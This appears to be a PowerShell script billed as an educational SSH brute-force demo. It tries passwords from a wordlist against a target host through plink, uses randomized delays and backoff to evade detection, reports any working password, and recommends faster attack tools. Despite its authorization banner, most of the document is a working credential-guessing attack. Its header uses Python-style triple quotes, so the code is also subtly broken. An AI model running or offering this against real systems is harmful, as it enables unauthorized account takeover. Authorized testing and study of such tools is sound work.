"""
.SYNOPSIS
    Educational SSH password guessing simulator / slow brute-force demo
    For authorized security testing / CTF / red-team exercises ONLY

    NEVER use this code against systems you do not own or have explicit written permission to test.

.DESCRIPTION
    Educational demonstration of SSH password guessing.
    Implements exponential backoff, random delays, basic logging.

    Real attacking tools (hydra, medusa, patator, ssh-audit + custom wordlist) are
    100–1000× faster and much harder to detect than this script.

.NOTES
    Recommended companion tools for real testing (with permission!):
    • hydra        • medusa       • nmap + ssh-brute script
    • patator      • crowbar      • ssh-audit + custom wordlist

.PARAMETER Target
    Hostname or IP address

.PARAMETER Port
    SSH port (default 22)

.PARAMETER User
    Username to test (usually one of: root, admin, user, ubuntu, ec2-user, ...)

.PARAMETER Wordlist
    Path to password file (one password per line)

.PARAMETER MaxAttempts
    Maximum number of passwords to try (safety limit)

.PARAMETER DelayMinMs
    Minimum artificial delay between attempts

.PARAMETER DelayMaxMs
    Maximum artificial delay

.PARAMETER BackoffFactor
    How to increase delay after failed attempt

.EXAMPLE
    .\ssh-brute-demo.ps1 -Target 192.168.56.101 -User testuser -Wordlist .\rockyou-1000.txt -DelayMinMs 800 -DelayMaxMs 4500
"""

[CmdletBinding()]
param (
    [Parameter(Mandatory = $true)]
    [string]$Target,

    [ValidateRange(1,65535)]
    [int]$Port = 22,

    [Parameter(Mandatory = $true)]
    [string]$User,

    [Parameter(Mandatory = $true)]
    [ValidateScript({Test-Path $_ -PathType Leaf})]
    [string]$Wordlist,

    [ValidateRange(1,10000)]
    [int]$MaxAttempts = 5000,

    [ValidateRange(50,10000)]
    [int]$DelayMinMs = 1200,

    [ValidateRange(500,30000)]
    [int]$DelayMaxMs = 8000,

    [ValidateRange(1.0,3.0)]
    [double]$BackoffFactor = 1.6,

    [switch]$WhatIf
)

# -----------------------------------------------------------------------------
#  Safety / legal banner (you SHOULD keep something similar in your repo)
# -----------------------------------------------------------------------------
Write-Host "`n" -ForegroundColor Black -BackgroundColor Yellow
Write-Host "  EDUCATIONAL / AUTHORIZED TESTING PURPOSES ONLY  " -ForegroundColor Black -BackgroundColor Yellow
Write-Host "  Using this script against systems WITHOUT EXPLICIT PERMISSION is illegal  " -ForegroundColor Black -BackgroundColor Yellow
Write-Host "`n" -ForegroundColor Black -BackgroundColor Yellow

if (-not $WhatIf) {
    $confirm = Read-Host "Type YES+ENTER if you have written permission to attack $Target"
    if ($confirm -ne "YES") {
        Write-Warning "Aborted by user"
        exit 1
    }
}

# -----------------------------------------------------------------------------
#  Prepare environment
# -----------------------------------------------------------------------------
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'Continue'

try {
    $passwords = Get-Content $Wordlist -Encoding UTF8 -ErrorAction Stop |
                 Where-Object { $_ -and $_.Trim() } |
                 Select-Object -First $MaxAttempts
}
catch {
    Write-Error "Cannot read wordlist: $($_.Exception.Message)"
    exit 2
}

if ($passwords.Count -eq 0) {
    Write-Error "Wordlist is empty"
    exit 3
}

Write-Host "Target          : $Target`:$Port"
Write-Host "Username        : $User"
Write-Host "Passwords count : $($passwords.Count)"
Write-Host "Delay range     : ${DelayMinMs}–${DelayMaxMs} ms"
Write-Host "Backoff factor  : $BackoffFactor ×"
Write-Host ""

# -----------------------------------------------------------------------------
#  Main loop
# -----------------------------------------------------------------------------
$currentDelay = $DelayMinMs
$attempt      = 0
$success      = $false

foreach ($pass in $passwords) {
    $attempt++
    $percent = [math]::Round(($attempt / $passwords.Count) * 100, 1)

    Write-Progress -Activity "Trying passwords" -Status "$attempt / $($passwords.Count)  ($percent%)" `
                   -PercentComplete $percent `
                   -CurrentOperation "Password: $(if($pass.Length -gt 3){$pass.Substring(0,3)+'…'}else{$pass})"

    $start = Get-Date

try {
        if ($WhatIf) {
            Write-Host "[WHATIF] Would try → $User : $pass" -ForegroundColor DarkGray
            Start-Sleep -Milliseconds $currentDelay
        }
        else {
            # === The only real SSH connection attempt ===
            $plinkResult = & plink.exe -batch -pw $pass -P $Port "$User@$Target" "echo success 2>&1" 2>&1
            # ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
            # You can replace plink with any other client that returns different exit code / output
            # on authentication failure (OpenSSH client, Bitvise, PowerSSH, etc.)

            if ($LASTEXITCODE -eq 0 -and $plinkResult -match "success") {
                Write-Host "`n[!] SUCCESS ───────────────────────────────────────────────" -ForegroundColor Green
                Write-Host "    Host      : $Target`:$Port"
                Write-Host "    User      : $User"
                Write-Host "    Password  : $pass"
                Write-Host "    Attempt   : $attempt / $($passwords.Count)"
                Write-Host "─────────────────────────────────────────────────────────────" -ForegroundColor Green
                $success = $true
                break
            }
        }
    }
    catch {
        Write-Verbose "Exception during attempt: $($_.Exception.Message)"
    }

    $elapsedMs = (Get-Date) - $start
    $effectiveDelay = [math]::Max(50, $currentDelay - $elapsedMs.TotalMilliseconds)

    # Exponential backoff + jitter
    $jitter = Get-Random -Minimum -350 -Maximum 650
    Start-Sleep -Milliseconds ($effectiveDelay + $jitter)

    # Increase delay for next attempt
    $currentDelay = [math]::Min($DelayMaxMs, [math]::Round($currentDelay * $BackoffFactor))
}

if (-not $success) {
    Write-Host "`nNo valid password found in $attempt attempts." -ForegroundColor DarkYellow
}

Write-Host "`nFinished." -ForegroundColor Cyan


